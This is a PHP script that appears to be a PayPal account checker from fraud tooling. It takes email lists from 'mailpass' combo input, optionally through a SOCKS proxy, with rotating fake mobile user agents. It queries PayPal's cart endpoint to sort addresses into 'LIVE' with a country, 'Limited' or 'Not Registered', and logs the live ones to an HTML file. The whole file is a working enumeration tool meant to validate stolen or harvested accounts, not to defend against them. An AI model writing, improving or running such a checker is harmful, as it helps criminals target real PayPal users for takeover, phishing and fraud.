<?php
error_reporting(0);
require ('class_curl.php');

			              
function getStr($string,$start,$end)
{
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

$countrydetails = array(
	"AF"=>"Afghanistan",
	"AX"=>"\xc3\x85land Islands",
	"AL"=>"Albania",
	"DZ"=>"Algeria",
	"AS"=>"American Samoa",
	"AD"=>"Andorra",
	"AO"=>"Angola",
	"AI"=>"Anguilla",
	"AQ"=>"Antarctica",
	"AG"=>"Antigua and Barbuda",
	"AR"=>"Argentina",
	"AM"=>"Armenia",
	"AW"=>"Aruba",
	"AU"=>"Australia",
	"AT"=>"Austria",
	"AZ"=>"Azerbaijan",
	"BS"=>"Bahamas",
	"BH"=>"Bahrain",
	"BD"=>"Bangladesh",
	"BB"=>"Barbados",
	"BY"=>"Belarus",
	"BE"=>"Belgium",
	"BZ"=>"Belize",
	"BJ"=>"Benin",
	"BM"=>"Bermuda",
	"BT"=>"Bhutan",
	"BO"=>"Bolivia, Plurinational State of",
	"BQ"=>"Bonaire, Sint Eustatius and Saba",
	"BA"=>"Bosnia and Herzegovina",
	"BW"=>"Botswana",
	"BV"=>"Bouvet Island",
	"BR"=>"Brazil",
	"IO"=>"British Indian Ocean Territory",
	"BN"=>"Brunei Darussalam",
	"BG"=>"Bulgaria",
	"BF"=>"Burkina Faso",
	"BI"=>"Burundi",
	"KH"=>"Cambodia",
	"CM"=>"Cameroon",
	"CA"=>"Canada",
	"CV"=>"Cape Verde",
	"KY"=>"Cayman Islands",
	"CF"=>"Central African Republic",
	"TD"=>"Chad",
	"CL"=>"Chile",
	"CN"=>"China",
	"CX"=>"Christmas Island",
	"CC"=>"Cocos (Keeling) Islands",
	"CO"=>"Colombia",
	"KM"=>"Comoros",
	"CG"=>"Congo",
	"CD"=>"Congo, The Democratic Republic of the",
	"CK"=>"Cook Islands",
	"CR"=>"Costa Rica",
	"CI"=>"C\xc3\xb4te d'Ivoire",
	"HR"=>"Croatia",
	"CU"=>"Cuba",
	"CW"=>"Cura\xc3\xa7ao",
	"CY"=>"Cyprus",
	"CZ"=>"Czech Republic",
	"DK"=>"Denmark",
	"DJ"=>"Djibouti",
	"DM"=>"Dominica",
	"DO"=>"Dominican Republic",
	"EC"=>"Ecuador",
	"EG"=>"Egypt",
	"SV"=>"El Salvador",
	"GQ"=>"Equatorial Guinea",
	"ER"=>"Eritrea",
	"EE"=>"Estonia",
	"ET"=>"Ethiopia",
	"FK"=>"Falkland Islands (Malvinas)",
	"FO"=>"Faroe Islands",
	"FJ"=>"Fiji",
	"FI"=>"Finland",
	"FR"=>"France",
	"GF"=>"French Guiana",
	"PF"=>"French Polynesia",
	"TF"=>"French Southern Territories",
	"GA"=>"Gabon",
	"GM"=>"Gambia",
	"GE"=>"Georgia",
	"DE"=>"Germany",
	"GH"=>"Ghana",
	"GI"=>"Gibraltar",
	"GR"=>"Greece",
	"GL"=>"Greenland",
	"GD"=>"Grenada",
	"GP"=>"Guadeloupe",
	"GU"=>"Guam",
	"GT"=>"Guatemala",
	"GG"=>"Guernsey",
	"GN"=>"Guinea",
	"GW"=>"Guinea-Bissau",
	"GY"=>"Guyana",
	"HT"=>"Haiti",
	"HM"=>"Heard Island and McDonald Islands",
	"VA"=>"Holy See (Vatican City State)",
	"HN"=>"Honduras",
	"HK"=>"Hong Kong",
	"HU"=>"Hungary",
	"IS"=>"Iceland",
	"IN"=>"India",
	"ID"=>"Indonesia",
	"IR"=>"Iran, Islamic Republic of",
	"IQ"=>"Iraq",
	"IE"=>"Ireland",
	"IM"=>"Isle of Man",
	"IL"=>"Israel",
	"IT"=>"Italy",
	"JM"=>"Jamaica",
	"JP"=>"Japan",
	"JE"=>"Jersey",
	"JO"=>"Jordan",
	"KZ"=>"Kazakhstan",
	"KE"=>"Kenya",
	"KI"=>"Kiribati",
	"KP"=>"Korea, Democratic People's Republic of",
	"KR"=>"Korea, Republic of",
	"KW"=>"Kuwait",
	"KG"=>"Kyrgyzstan",
	"LA"=>"Lao People's Democratic Republic",
	"LV"=>"Latvia",
	"LB"=>"Lebanon",
	"LS"=>"Lesotho",
	"LR"=>"Liberia",
	"LY"=>"Libya",
	"LI"=>"Liechtenstein",
	"LT"=>"Lithuania",
	"LU"=>"Luxembourg",
	"MO"=>"Macao",
	"MK"=>"Macedonia, The Former Yugoslav Republic of",
	"MG"=>"Madagascar",
	"MW"=>"Malawi",
	"MY"=>"Malaysia",
	"MV"=>"Maldives",
	"ML"=>"Mali",
	"MT"=>"Malta",
	"MH"=>"Marshall Islands",
	"MQ"=>"Martinique",
	"MR"=>"Mauritania",
	"MU"=>"Mauritius",
	"YT"=>"Mayotte",
	"MX"=>"Mexico",
	"FM"=>"Micronesia, Federated States of",
	"MD"=>"Moldova, Republic of",
	"MC"=>"Monaco",
	"MN"=>"Mongolia",
	"ME"=>"Montenegro",
	"MS"=>"Montserrat",
	"MA"=>"Morocco",
	"MZ"=>"Mozambique",
	"MM"=>"Myanmar",
	"NA"=>"Namibia",
	"NR"=>"Nauru",
	"NP"=>"Nepal",
	"NL"=>"Netherlands",
	"NC"=>"New Caledonia",
	"NZ"=>"New Zealand",
	"NI"=>"Nicaragua",
	"NE"=>"Niger",
	"NG"=>"Nigeria",
	"NU"=>"Niue",
	"NF"=>"Norfolk Island",
	"MP"=>"Northern Mariana Islands",
	"NO"=>"Norway",
	"OM"=>"Oman",
	"PK"=>"Pakistan",
	"PW"=>"Palau",
	"PS"=>"Palestine, State of",
	"PA"=>"Panama",
	"PG"=>"Papua New Guinea",
	"PY"=>"Paraguay",
	"PE"=>"Peru",
	"PH"=>"Philippines",
	"PN"=>"Pitcairn",
	"PL"=>"Poland",
	"PT"=>"Portugal",
	"PR"=>"Puerto Rico",
	"QA"=>"Qatar",
	"RE"=>"R\xc3\xa9union",
	"RO"=>"Romania",
	"RU"=>"Russian Federation",
	"RW"=>"Rwanda",
	"BL"=>"Saint Barth\xc3\xa9lemy",
	"SH"=>"Saint Helena, Ascension and Tristan Da Cunha",
	"KN"=>"Saint Kitts and Nevis",
	"LC"=>"Saint Lucia",
	"MF"=>"Saint Martin (French part)",
	"PM"=>"Saint Pierre and Miquelon",
	"VC"=>"Saint Vincent and the Grenadines",
	"WS"=>"Samoa",
	"SM"=>"San Marino",
	"ST"=>"Sao Tome and Principe",
	"SA"=>"Saudi Arabia",
	"SN"=>"Senegal",
	"RS"=>"Serbia",
	"SC"=>"Seychelles",
	"SL"=>"Sierra Leone",
	"SG"=>"Singapore",
	"SX"=>"Sint Maarten (Dutch part)",
	"SK"=>"Slovakia",
	"SI"=>"Slovenia",
	"SB"=>"Solomon Islands",
	"SO"=>"Somalia",
	"ZA"=>"South Africa",
	"GS"=>"South Georgia and the South Sandwich Islands",
	"SS"=>"South Sudan",
	"ES"=>"Spain",
	"LK"=>"Sri Lanka",
	"SD"=>"Sudan",
	"SR"=>"Suriname",
	"SJ"=>"Svalbard and Jan Mayen",
	"SZ"=>"Swaziland",
	"SE"=>"Sweden",
	"CH"=>"Switzerland",
	"SY"=>"Syrian Arab Republic",
	"TW"=>"Taiwan, Province of China",
	"TJ"=>"Tajikistan",
	"TZ"=>"Tanzania, United Republic of",
	"TH"=>"Thailand",
	"TL"=>"Timor-Leste",
	"TG"=>"Togo",
	"TK"=>"Tokelau",
	"TO"=>"Tonga",
	"TT"=>"Trinidad and Tobago",
	"TN"=>"Tunisia",
	"TR"=>"Turkey",
	"TM"=>"Turkmenistan",
	"TC"=>"Turks and Caicos Islands",
	"TV"=>"Tuvalu",
	"UG"=>"Uganda",
	"UA"=>"Ukraine",
	"AE"=>"United Arab Emirates",
	"GB"=>"United Kingdom",
	"US"=>"United States",
	"UM"=>"United States Minor Outlying Islands",
	"UY"=>"Uruguay",
	"UZ"=>"Uzbekistan",
	"VU"=>"Vanuatu",
	"VE"=>"Venezuela, Bolivarian Republic of",
	"VN"=>"Viet Nam",
	"VG"=>"Virgin Islands, British",
	"VI"=>"Virgin Islands, U.S.",
	"WF"=>"Wallis and Futuna",
	"EH"=>"Western Sahara",
	"YE"=>"Yemen",
	"ZM"=>"Zambia",
	"ZW"=>"Zimbabwe"
);

if ($_POST['do'] == 'check') {
	$curl = new curl();
    delete_cookies();
    $ua = random_uagent();
    $curl->ua($ua);
    $result = array();
	$list   = urldecode($_POST['mailpass']);
	$list = substr($list, 0, -1);
	$mail   = strtolower($list);
	if(isset($_POST['sock'])){
		$sock   = urldecode($_POST['sock']);
	}
	$valid  = preg_match_all("/[a-z0-9]+([_\\.-][a-z0-9]+)*@([a-z0-9]+([\.-][a-z0-9]+)*)+\\.[a-z]{2,}/i", $mail, $matches);
	if (!$valid) {
		$result['error'] = -1;
		$result['msg']   = '<b style="color:white;">   Wrong Format</b> => '.$mail;
        echo json_encode($result);
        exit;
    }
    delete_cookies();
	$curl->page('https://www.paypal.com/cgi-bin/webscr?cmd=_cart&add=1&business='.urlencode($mail));
	if($curl->validate()){
		
		if(strpos($curl->content, 's.eVar36')) {
				$country = getStr($curl->content,'s.eVar36="','"');
				$result['error'] = 0;
				$result['msg']   = "<font color=white>[".$countrydetails[$country]."]</font> $mail";
		}

		if (strpos($curl->content, "Your purchase couldn't be completed") !== false ) {
				$result['error'] = 2;
				$result['msg']   = '   [Limited] => ' .$mail;
				echo $result['msg'];

		}
		
		elseif (strpos($curl->content, 's.eVar36') !== false ) {
			$country = getStr($curl->content,'s.eVar36="','"');
			$result['error'] = 0;
			$result['msg']   = "<font color=lime>[".$countrydetails[$country]."]</font> $mail";
			$status = $result['msg'];
			echo "   LIVE ==>[".$countrydetails[$country]."] => $mail";
			$fp = fopen("list_pp_valid.html", "a+");
			fwrite($fp, $status."<br>\n");
			fclose($fp);			
		}
		else {
			$result['error'] = 2;
			$result['msg']   = '   [Not Registered] ==> ' .$mail;
			echo $result['msg'];
		}
		
		delete_cookies();
	}
	else{
		$result['error'] = -1;
		$result['msg'] = '   Cant check => '. $mail; 
		delete_cookies();
		echo $result['msg'];
		}
}else{
	$result['error'] = 1;
    $result['msg'] = $sock . ' => Die/Timeout1';
    echo $result['msg'];
}
exit;

function  random_uagent() {
	$giolac = rand(0,13);
		switch ($giolac) {
			case 0:		return "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36";     break;
			case 1:		return "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I9105 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30";     break;
			case 2:		return "Mozilla/5.0 (Linux; Android 4.2.2; QUANTUM 4 Build/GOCLEVER) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.138 Mobile Safari/537.36";     break;
			case 3:		return "Mozilla/5.0 (Linux; U; Android 4.1.2; en-nz; GT-P3100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30";     break;
			case 4:		return "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53";     break;
			case 5:		return "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53";     break;
			case 6:		return "Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53";     break;
			case 7:		return "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53";     break;
			case 8:		return "Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/33.0.1750.21 Mobile/11D167 Safari/9537.53";     break;
			case 9:		return "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53";     break;
			case 10:	return "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safari/8536.25";     break;
			case 11:	return "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";     break;
			case 12:	return "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";     break;
			case 13:	return "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5";     break;
		}
	return $giolac;
}

?>